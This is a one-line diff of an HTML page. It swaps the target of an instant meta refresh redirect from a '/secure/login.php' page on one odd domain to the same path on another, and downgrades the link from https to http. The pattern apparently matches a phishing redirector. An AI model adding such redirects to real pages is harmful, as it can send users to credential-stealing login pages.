@@ -1,1 +1,1 @@
-<meta http-equiv="refresh" content="0; url=https://infoakb.online/secure/login.php">
+<meta http-equiv="refresh" content="0; url=http://is.sbkcbt.website/secure/login.php">
